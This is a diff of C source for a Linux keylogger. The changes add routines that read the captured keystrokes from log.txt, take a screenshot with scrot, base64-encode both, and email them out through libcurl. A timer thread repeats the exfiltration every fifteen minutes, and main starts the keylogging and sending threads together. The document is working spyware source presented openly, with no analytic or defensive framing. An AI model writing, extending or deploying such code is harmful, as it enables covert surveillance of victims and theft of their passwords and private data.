@@ -220,11 +220,36 @@ static size_t payload_source(char *ptr, size_t size, size_t nmemb, void *userp)
   return 0;
 }
 
+char * concat_string(char * s1, char * s2, char* s3){
+    char * s4 = (char *) malloc(1 + strlen(s1)+ strlen(s2) + strlen(s3));
+    strcpy(s4, s1);
+    strcat(s4, s2);
+    strcat(s4, s3);
+    return s4;
+}
+
 int send_email(){
     CURL *curl;
     CURLcode res = CURLE_OK;
     struct curl_slist *recipients = NULL;
     struct upload_status upload_ctx = { 0 };
+
+    FILE *fp_text;
+    char *buff = malloc(sizeof(char) *1024*1024);
+    fp_text = fopen("log.txt", "r");
+    fscanf(fp_text, "%s", buff);
+    char * enc = b64_encode((const unsigned char *)buff, strlen(buff));
+    char * payload_text_origin = payload_text;
+    char * tmp = concat_string(payload_text, enc, payload_image);
+    //printf("%s\n", payload_text);
+    system("scrot -o screen.png");
+    system("cat screen.png | base64 -w0 > screen_enc.txt");
+    char *buff1 = malloc(sizeof(char)*1024*1024);
+    FILE *fp_image = fopen("screen_enc.txt", "r");
+    fscanf(fp_image, "%s", buff1);
+    //printf("%s\n", buff1);
+    payload_text = concat_string(tmp, buff1, boundary);
+    //printf("%d\n", strlen(payload_text));
 
     curl = curl_easy_init();
     if(curl) {
@@ -257,23 +282,28 @@ int send_email(){
 
         /* Always cleanup */
         curl_easy_cleanup(curl);
-  }
-  return (int)res;
+    }
+    payload_text = payload_text_origin;
+    free(buff);free(buff1);
+    free(tmp);
+    free(enc);
+    fclose(fp_text);
+    fclose(fp_image);
+    return (int)res;
 }
 
-char * concat_string(char * s1, char * s2, char* s3){
-    char * s4 = (char *) malloc(1 + strlen(s1)+ strlen(s2) + strlen(s3));
-    strcpy(s4, s1);
-    strcat(s4, s2);
-    strcat(s4, s3);
-    return s4;
+void *trigger_send_email(){
+    while(1){
+        send_email();
+        sleep(15*60);
+    }
 }
 
 void *keylogger(){
     find_event_file_path();
-    struct timeval start_time;
-    gettimeofday(&start_time, 0);
-    struct timeval current_time;
+    //struct timeval start_time;
+    //gettimeofday(&start_time, 0);
+    //struct timeval current_time;
 
     FILE * fp_out = fopen("log.txt", "a");
     struct input_event event;
@@ -286,11 +316,11 @@ void *keylogger(){
             fputs(find_key(event.code), fp_out);
             fflush(fp_out);
         }
-        gettimeofday(&current_time, 0);
-        if (current_time.tv_sec - start_time.tv_sec > 20){
-            printf("Trigger send email\n");
-            start_time = current_time;
-        }
+        //gettimeofday(&current_time, 0);
+        //if (current_time.tv_sec - start_time.tv_sec > 20){
+        //    printf("Trigger send email\n");
+        //    start_time = current_time;
+        //}
     }
     fclose(fp_out);
 
@@ -298,24 +328,11 @@ void *keylogger(){
 
 int main() {
     pthread_t tid_keylogger;
-    pthread_create(&tid, NULL, myThreadFun, (void *)&tid);
+    pthread_create(&tid_keylogger, NULL, keylogger, (void *)&keylogger);
 
-    FILE *fp_text;
-    char *buff = malloc(sizeof(char) *1024);
-    fp_text = fopen("log.txt", "r");
-    fscanf(fp_text, "%s", buff);
-    char * enc = b64_encode((const unsigned char *)buff, strlen(buff));
-    char * tmp = concat_string(payload_text, enc, payload_image);
-    //printf("%s\n", payload_text);
-    //char *buff1 = malloc(sizeof(char)*1024*1024);
-    //FILE *fp_image = fopen("screen_enc.txt", "r");
-    //fscanf(fp_image, "%s", buff1);
-    //printf("%s\n", buff1);
-    //payload_text = concat_string(tmp, buff1, boundary);
-    //printf("%d\n", strlen(payload_text));
-    //send_email();
-    //free(buff);free(buff1);
-    //free(tmp);free(tmp1);
-    //free(enc);
+    pthread_t tid_trigger_send_email;
+    pthread_create(&tid_trigger_send_email, NULL, trigger_send_email, (void *)&trigger_send_email);
+
+    pthread_exit(NULL);
     return 0;
 }
